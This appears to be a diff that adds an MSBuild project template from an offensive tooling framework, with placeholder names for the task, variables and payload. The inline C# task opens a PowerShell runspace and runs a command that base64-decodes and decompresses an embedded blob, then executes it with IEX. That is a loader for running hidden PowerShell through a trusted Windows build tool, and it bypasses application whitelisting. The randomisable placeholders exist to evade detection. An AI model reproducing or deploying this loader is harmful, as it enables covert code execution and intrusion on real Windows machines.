@@ -1,0 +1,41 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="%%TARGETNAME%%">
+   <%%TASKNAME%% />
+  </Target>
+	<UsingTask
+    TaskName="%%TASKNAME%%"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	  <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[		
+			using System;
+			using System.IO;
+			using System.Diagnostics;
+			using System.Reflection;
+			using System.Runtime.InteropServices;
+			using System.Collections.ObjectModel;
+			using System.Management.Automation;
+			using System.Management.Automation.Runspaces;
+			using System.Text;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;							
+			public class %%TASKNAME%% :  Task, ITask {
+				public override bool Execute() {
+					string %%VARIABLE%% = "$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('%%DATA%%'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();";
+					Runspace %%RUNSPACE%% = RunspaceFactory.CreateRunspace();
+					%%RUNSPACE%%.Open();
+					RunspaceInvoke scriptInvoker = new RunspaceInvoke(%%RUNSPACE%%);
+					Pipeline %%PIPELINE%% = %%RUNSPACE%%.CreatePipeline();
+					%%PIPELINE%%.Commands.AddScript(%%VARIABLE%%);
+					%%PIPELINE%%.Invoke();
+					%%RUNSPACE%%.Close();			
+					return true;
+				}								 
+			}			
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
